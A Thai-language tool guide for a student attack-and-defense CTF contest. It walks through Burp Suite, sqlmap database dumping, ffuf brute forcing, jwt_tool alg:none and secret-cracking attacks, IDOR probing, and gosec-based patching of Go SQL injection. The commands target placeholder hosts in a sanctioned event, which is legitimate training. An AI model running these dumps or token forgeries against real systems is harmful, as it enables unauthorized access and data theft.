# 🛡️ CTF & Attack & Defense — คู่มือ Tools วันแข่ง
> **IT Clash 2569 | Cybersecurity Track | 16 พฤษภาคม 2569**
> คู่มือนี้อธิบายวิธีติดตั้งและใช้งาน tools ทุกตัวที่ต้องใช้วันแข่ง

---

## 📋 สารบัญ

1. [ติดตั้งทุก Tool พร้อมกัน (One-liner)](#-ติดตั้งทุก-tool-พร้อมกัน)
2. [Burp Suite](#-1-burp-suite--จับและแก้-http-request)
3. [sqlmap](#-2-sqlmap--โจมตี-sql-injection-อัตโนมัติ)
4. [ffuf](#-3-ffuf--หา-hidden-endpoint)
5. [jwt_tool](#-4-jwt_tool--โจมตี-jwt)
6. [gosec](#-5-gosec--scan-go-code-หาช่องโหว่)
7. [Bruno](#-6-bruno--http-client)
8. [SecLists](#-7-seclists--wordlist)
9. [Strategy วันแข่ง](#-strategy-วันแข่ง)

---

## ⚡ ติดตั้งทุก Tool พร้อมกัน

> รันคำสั่งนี้คำสั่งเดียว ติดตั้งได้ทุกอย่างเลย (ยกเว้น Burp Suite และ Bruno ที่ต้องโหลดแยก)

```bash
sudo apt update && \
sudo apt install -y sqlmap ffuf python3-pip git curl wget && \
git clone https://github.com/ticarpi/jwt_tool && \
pip3 install -r jwt_tool/requirements.txt && \
go install github.com/securego/gosec/v2/cmd/gosec@latest && \
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O common.txt
```

---

## 🔵 1. Burp Suite — จับและแก้ HTTP request

### Burp Suite คืออะไร?
Burp Suite คือ proxy ที่นั่งอยู่ระหว่าง browser กับ server
ทุก request ที่ออกจาก browser จะผ่าน Burp ก่อน ทำให้เราจับ แก้ไข และยิงซ้ำได้

### ติดตั้ง

**Ubuntu:**
```bash
# โหลด installer จาก portswigger
wget "https://portswigger.net/burp/releases/download?product=community&type=Linux" -O burpsuite.sh
chmod +x burpsuite.sh
./burpsuite.sh
```

**หรือโหลดจากเว็บ:**
- ไปที่: `https://portswigger.net/burp/communitydownload`
- เลือก Linux → กด Download

### ตั้งค่า Proxy

**ขั้นตอนที่ 1:** เปิด Burp Suite → ไปที่ `Proxy` → `Options`
- ตรวจสอบว่า Listen on: `127.0.0.1:8080`

**ขั้นตอนที่ 2:** ติดตั้ง FoxyProxy บน Browser
```
Chrome/Firefox Extension Store → ค้นหา "FoxyProxy Standard" → Install
```

**ขั้นตอนที่ 3:** ตั้งค่า FoxyProxy
```
FoxyProxy → Add Proxy
Title: Burp
Host: 127.0.0.1
Port: 8080
```

**ขั้นตอนที่ 4:** ติดตั้ง SSL Certificate (สำหรับ HTTPS)
```
เปิด browser → ไปที่ http://burpsuite → Download CA Certificate
Browser Settings → Certificates → Import → เลือกไฟล์ที่โหลดมา
```

### วิธีใช้งาน

#### 🔴 Intercept — จับ request
```
Proxy → Intercept → เปิด "Intercept is on"
เปิดเว็บ target → request จะค้างที่ Burp
แก้ค่าที่ต้องการ → กด Forward ส่งต่อ
```

#### 🟡 Repeater — ยิง request ซ้ำ
```
จับ request ที่ต้องการ → คลิกขวา → Send to Repeater
ไปที่ tab Repeater
แก้ไข request → กด Send → ดู Response
ทำซ้ำได้เท่าที่ต้องการ ← ใช้ทดสอบ payload SQLi และ JWT
```

#### 🟢 Save Request เป็นไฟล์ (ใช้กับ sqlmap)
```
คลิกขวาที่ request → Save item → เลือก path
จะได้ไฟล์ request.txt ไปใช้กับ sqlmap
```

#### 🔵 Intruder — ยิง payload อัตโนมัติ
```
คลิกขวาที่ request → Send to Intruder
ไปที่ tab Intruder → Positions
เลือกตำแหน่งที่จะใส่ payload (§value§)
Payloads → ใส่ list ของ payload
กด Start Attack
```

---

## 💉 2. sqlmap — โจมตี SQL Injection อัตโนมัติ

### sqlmap คืออะไร?
sqlmap ทำ SQL Injection อัตโนมัติตั้งแต่ detect หาช่องโหว่ไปจนถึง dump ข้อมูลออกมา

### ติดตั้ง
```bash
sudo apt install sqlmap -y

# ตรวจสอบ
sqlmap --version
```

### วิธีใช้งาน

#### 🎯 ยิง GET parameter (พบบ่อยที่สุด)
```bash
# รูปแบบ URL: http://target.com/products?id=1
sqlmap -u "http://target.com/products?id=1" --dbms=postgresql

# อธิบาย:
# -u = URL เป้าหมาย
# --dbms=postgresql = บอกว่าใช้ PostgreSQL (ตรงกับโจทย์)
```

#### 🎯 ยิง POST form (login page)
```bash
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --dbms=postgresql

# อธิบาย:
# --data = ข้อมูลที่ส่งไปใน body (เหมือนกรอก form)
```

#### 🎯 ยิงโดยใช้ Burp request file (แนะนำที่สุด)
```bash
# save request จาก Burp แล้วใช้คำสั่งนี้
sqlmap -r request.txt --dbms=postgresql

# อธิบาย:
# -r = อ่าน HTTP request จากไฟล์ที่ save จาก Burp
# ไม่ต้องพิมพ์ URL ยาวๆ เอง
```

#### 🔍 ดู Database ที่มีทั้งหมด
```bash
sqlmap -u "http://target.com/products?id=1" --dbms=postgresql --dbs

# ผลลัพธ์ตัวอย่าง:
# [*] information_schema
# [*] myapp_db
# [*] postgres
```

#### 🔍 ดู Tables ใน Database
```bash
sqlmap -u "http://target.com/products?id=1" \
  --dbms=postgresql \
  -D myapp_db \
  --tables

# อธิบาย:
# -D myapp_db = เลือก database ที่ต้องการ
# --tables = แสดง table ทั้งหมด
```

#### 🔍 Dump ข้อมูลใน Table
```bash
sqlmap -u "http://target.com/products?id=1" \
  --dbms=postgresql \
  -D myapp_db \
  -T users \
  --dump

# อธิบาย:
# -T users = เลือก table ชื่อ users
# --dump = ดึงข้อมูลออกมาทั้งหมด
```

#### ⚡ Flags ที่มีประโยชน์เพิ่มเติม
```bash
--batch          # ตอบ yes อัตโนมัติทุกคำถาม ไม่ต้องกด enter
--level=5        # ลองโจมตีหนักขึ้น
--risk=3         # ใช้ payload อันตรายขึ้น
--threads=10     # เร็วขึ้น 10 เท่า
--dump-all       # dump ทุก database ทุก table เลย
--passwords      # พยายาม crack password hash

# ตัวอย่างเต็ม:
sqlmap -r request.txt --dbms=postgresql --batch --dump-all --threads=10
```

---

## 🔍 3. ffuf — หา Hidden Endpoint

### ffuf คืออะไร?
ffuf ใช้ brute force หาไฟล์และ directory ที่ซ่อนอยู่บนเว็บ เช่น `/admin`, `/api/debug`, `/backup`

### ติดตั้ง
```bash
sudo apt install ffuf -y

# ตรวจสอบ
ffuf -V
```

### วิธีใช้งาน

#### 🎯 หา Hidden Directory พื้นฐาน
```bash
ffuf -u http://target.com/FUZZ -w common.txt

# อธิบาย:
# -u = URL โดย FUZZ คือตำแหน่งที่จะ brute force
# -w = wordlist ที่ใช้ (common.txt จาก SecLists)
```

#### 🎯 หา Hidden File พร้อม Extension
```bash
ffuf -u http://target.com/FUZZ -w common.txt -e .php,.go,.js,.txt,.json

# อธิบาย:
# -e = extension ที่จะลองต่อท้าย เช่น /admin.php /config.json
```

#### 🎯 หา Hidden Parameter ใน URL
```bash
ffuf -u "http://target.com/api?FUZZ=test" -w common.txt

# ใช้หา parameter ที่ซ่อนอยู่ เช่น ?debug=true หรือ ?admin=1
```

#### 🎯 กรอง Response ที่ไม่ต้องการ
```bash
# กรองออก 404 (ไม่เจอ)
ffuf -u http://target.com/FUZZ -w common.txt -fc 404

# กรองเฉพาะ 200 (เจอแน่ๆ)
ffuf -u http://target.com/FUZZ -w common.txt -mc 200,301,302

# อธิบาย:
# -fc = filter code (กรองออก)
# -mc = match code (เอาแค่นี้)
```

#### ⚡ เพิ่มความเร็ว
```bash
ffuf -u http://target.com/FUZZ -w common.txt -t 50

# -t 50 = ใช้ 50 threads พร้อมกัน เร็วขึ้นมาก
```

---

## 🔑 4. jwt_tool — โจมตี JWT

### jwt_tool คืออะไร?
jwt_tool ใช้โจมตี JWT token ทุกรูปแบบ ทั้ง decode, แก้ payload, alg:none attack และ crack secret

### ติดตั้ง
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# ทดสอบ
python3 jwt_tool.py --help
```

### วิธีใช้งาน

#### ขั้นตอนที่ 1: หา JWT Token ก่อน
```
เปิด browser DevTools (F12) → Application → Local Storage
หรือ Burp Suite → จับ request → ดูใน Header: Authorization: Bearer eyJ...
```

#### 🔍 Decode Token — ดู Payload
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciJ9.abc

# ผลลัพธ์จะแสดง:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user_id":1,"role":"user"}
```

#### 🚨 alg:none Attack — ข้าม Signature ทั้งหมด
```bash
python3 jwt_tool.py <token> -X a

# วิธีทำงาน:
# เปลี่ยน alg เป็น "none"
# ลบ signature ออก
# ถ้า server ไม่เช็ค algorithm = ผ่านได้เลย!
```

#### 🔓 Crack Weak Secret
```bash
# ใช้ wordlist ทั่วไป
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# ใช้ wordlist เล็กๆ ก่อน
python3 jwt_tool.py <token> -C -d common.txt

# อธิบาย:
# -C = crack mode
# -d = dictionary/wordlist file
```

#### ✏️ แก้ Payload แล้ว Sign ใหม่ (หลัง crack secret ได้)
```bash
# ขั้นตอน:
# 1. crack secret ได้แล้ว สมมติได้ว่า "mysecret"
# 2. แก้ payload เปลี่ยน role เป็น admin

python3 jwt_tool.py <token> -T -S hs256 -p "mysecret"

# จะเปิด interactive mode ให้แก้ค่าใน payload ได้
# แก้ "role":"user" → "role":"admin"
# กด enter → ได้ token ใหม่ที่ใช้ได้จริง
```

#### 🔁 ทดสอบ Token ที่แก้แล้ว
```bash
# ใช้ curl ส่ง token ใหม่ไปทดสอบ
curl -H "Authorization: Bearer <new_token>" http://target.com/api/admin
```

---

## 🔐 5. gosec — Scan Go Code หาช่องโหว่

### gosec คืออะไร?
gosec scan Go source code อัตโนมัติ หาช่องโหว่ด้านความปลอดภัย เช่น SQLi, hardcoded password, weak crypto

### ติดตั้ง
```bash
# ต้องมี Go installed ก่อน
go install github.com/securego/gosec/v2/cmd/gosec@latest

# หรือโหลด binary ตรง
wget https://github.com/securego/gosec/releases/latest/download/gosec_linux_amd64.tar.gz
tar -xzf gosec_linux_amd64.tar.gz
sudo mv gosec /usr/local/bin/
```

### วิธีใช้งาน

#### 🔍 Scan ทั้ง Project
```bash
# ไปที่ folder ของ Go project ก่อน
cd /path/to/go-project

# scan ทุกไฟล์
gosec ./...

# ผลลัพธ์ตัวอย่าง:
# [HIGH] G201: SQL string formatting (Possible SQL injection)
#   > Line 45: db.Query("SELECT * FROM users WHERE id=" + id)
```

#### 🔍 Scan แล้ว Export เป็น JSON
```bash
gosec -fmt json -out report.json ./...
cat report.json
```

#### ⚠️ ความหมายของ Severity
```
HIGH   → ต้องแก้ทันที เช่น SQLi, hardcoded secret
MEDIUM → ควรแก้ เช่น weak crypto
LOW    → แก้ได้ แต่ไม่เร่งด่วน
```

#### 🩹 หลัง gosec report แล้ว patch ยังไง
```bash
# gosec บอกว่า line 45 มี SQLi
# เปิดไฟล์
nano main.go

# หา line 45
# เปลี่ยนจาก:
db.Query("SELECT * FROM users WHERE id=" + id)

# เป็น:
db.Query("SELECT * FROM users WHERE id=$1", id)

# บันทึก แล้ว rebuild
docker compose up --build
```

---

## 📡 6. Bruno — HTTP Client

### Bruno คืออะไร?
Bruno ใช้ส่ง HTTP request ไปหา API โดยตรง เหมาะสำหรับทดสอบ endpoint ที่ต้องการ custom header เช่น JWT

### ติดตั้ง
```bash
# Ubuntu - โหลด .deb จาก GitHub
wget https://github.com/usebruno/bruno/releases/latest/download/bruno_linux_x86_64.deb
sudo dpkg -i bruno_linux_x86_64.deb

# หรือโหลดจากเว็บ: usebruno.com
```

### วิธีใช้งาน

#### ตั้งค่าเริ่มต้น
```
1. เปิด Bruno
2. Create Collection → ตั้งชื่อ เช่น "CTF Attack"
3. Add Environment → ตั้งค่า variable:
   base_url = http://target.com
   token = (ใส่ JWT token ที่ได้มา)
```

#### 🎯 ส่ง GET Request พร้อม JWT
```
New Request → GET
URL: {{base_url}}/api/users/1
Headers:
  Authorization: Bearer {{token}}
กด Send → ดู Response
```

#### 🎯 ส่ง POST Request (Login)
```
New Request → POST
URL: {{base_url}}/api/login
Body → JSON:
{
  "username": "admin",
  "password": "password"
}
กด Send → copy token จาก response
```

#### 🎯 ทดสอบ IDOR
```
GET {{base_url}}/api/users/1  ← ของตัวเอง
GET {{base_url}}/api/users/2  ← ของคนอื่น (ถ้าได้ข้อมูล = IDOR!)
GET {{base_url}}/api/users/3
...ลองเปลี่ยน ID ไปเรื่อยๆ
```

---

## 📚 7. SecLists — Wordlist

### SecLists คืออะไร?
SecLists คือ collection ของ wordlist ที่ใช้กับ ffuf และ tools อื่นๆ สำหรับ brute force

### ติดตั้ง

**โหลดแค่ไฟล์ที่ใช้บ่อย (แนะนำ — ไม่เปลือง disk):**
```bash
# Directory brute force
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt

# Parameter names
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt

# Password list (สำหรับ jwt crack)
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

**โหลดทั้งหมด (ใช้เวลานาน ไฟล์ใหญ่มาก):**
```bash
git clone --depth 1 https://github.com/danielmiessler/SecLists
```

### วิธีใช้ร่วมกับ ffuf
```bash
# ใช้ common.txt หา directory
ffuf -u http://target.com/FUZZ -w common.txt -fc 404

# ใช้ parameter names หา hidden parameter
ffuf -u "http://target.com/api?FUZZ=test" -w burp-parameter-names.txt -fc 404
```

### วิธีใช้ร่วมกับ jwt_tool
```bash
python3 jwt_tool/jwt_tool.py <token> -C -d 10-million-password-list-top-10000.txt
```

---

## 🎮 Strategy วันแข่ง

### ⏰ 09:00–10:00 น. (ชั่วโมงเตรียม — สำคัญที่สุด)

**เพื่อน (Defense) ทำทันที:**
```bash
# 1. รับ source code มา
git clone <repo_url>
cd <project>

# 2. scan หาช่องโหว่
gosec ./...

# 3. เปิดไฟล์ main.go หาจุดสำคัญ
grep -n "db.Query" main.go          # หา SQLi
grep -n "jwt.Parse" main.go         # หา JWT
grep -n "FormValue\|Query().Get" main.go  # หาจุดรับ input

# 4. patch SQLi ทุกจุด
# เปลี่ยน string concat → $1, $2

# 5. patch JWT
# เพิ่ม algorithm check

# 6. deploy
docker compose up --build -d

# 7. ทดสอบว่า site ยัง up
curl http://localhost:8080
```

**คุณ (Attack) ทำทันที:**
```bash
# อ่าน source code หาช่องโหว่ที่เป็นเป้าหมายทีมอื่น
grep -n "db.Query" main.go
grep -n "jwt.Parse" main.go
# จดไว้ว่า endpoint ไหนน่าโจมตี
```

---

### ⚔️ 10:00 น. เป็นต้นไป (เริ่มแข่ง)

#### Attack Flow (ทำตามลำดับนี้)
```bash
# Step 1: Recon หา endpoint ที่ซ่อนอยู่
ffuf -u http://target-ip/FUZZ -w common.txt -fc 404 -t 50

# Step 2: จับ request ด้วย Burp Suite
# เปิด Burp → เปิด browser → เปิดเว็บ target → ดู request

# Step 3: ลอง SQLi ด้วยมือก่อน
# ใส่ ' ในช่อง input ดูว่า error ไหม
# ถ้า error → มีช่องโหว่ → ใช้ sqlmap

# Step 4: ใช้ sqlmap
sqlmap -r request.txt --dbms=postgresql --batch --dump-all

# Step 5: ลอง JWT attack
# copy token จาก browser/Burp
python3 jwt_tool/jwt_tool.py <token> -X a
python3 jwt_tool/jwt_tool.py <token> -C -d common.txt

# Step 6: แจ้ง Staff ทันทีที่โจมตีสำเร็จ!
# (ต้องสาธิตให้ Staff เห็นสด)
```

#### Defense Flow (ทำตลอดเวลา)
```bash
# ดู log ตลอดเวลา
docker compose logs -f

# ถ้าโดนโจมตีและ site ล่ม → รีบ restart
docker compose restart

# ถ้าต้อง patch แล้ว redeploy
nano main.go          # แก้ code
docker compose up --build -d   # rebuild
curl http://localhost:8080     # ทดสอบ
```

---

### 🚨 กฎสำคัญที่ต้องจำ

```
✅ Search Google ได้ตลอด
✅ แจ้ง Staff ทันทีที่โจมตีสำเร็จ (ต้องสาธิตสด)
✅ จองคิวก่อนโจมตีทีมอื่นทุกครั้ง
❌ ห้ามใช้ AI ทุกรูปแบบ
❌ ห้ามโจมตีทีมที่กำลังถูกทีมอื่นโจมตีอยู่
❌ ห้าม DoS (ยิง request เยอะๆ จนล่ม นอกจากช่วงจองคิว)
❌ ห้ามสื่อสารกับทีมอื่น
```

---

### 💰 คะแนน A&D

| เหตุการณ์ | คะแนน |
|---|---|
| โจมตีสำเร็จ พบช่องโหว่ | +50 |
| ทำระบบล่ม | +100 |
| โดนพบช่องโหว่ | -50 |
| ระบบล่ม | -100 |
| Downtime | -10/นาที (ปัดขึ้น) |

> 💡 **สรุป:** Defense ให้ดี ไม่ให้ล่ม = ไม่เสียคะแนน และยิ่งโจมตีทีมอื่นได้ = ได้คะแนนเพิ่ม

---

*คู่มือนี้จัดทำสำหรับ IT Clash 2569 | Cybersecurity Track*
*โชคดีวันแข่งครับ! 🔥*
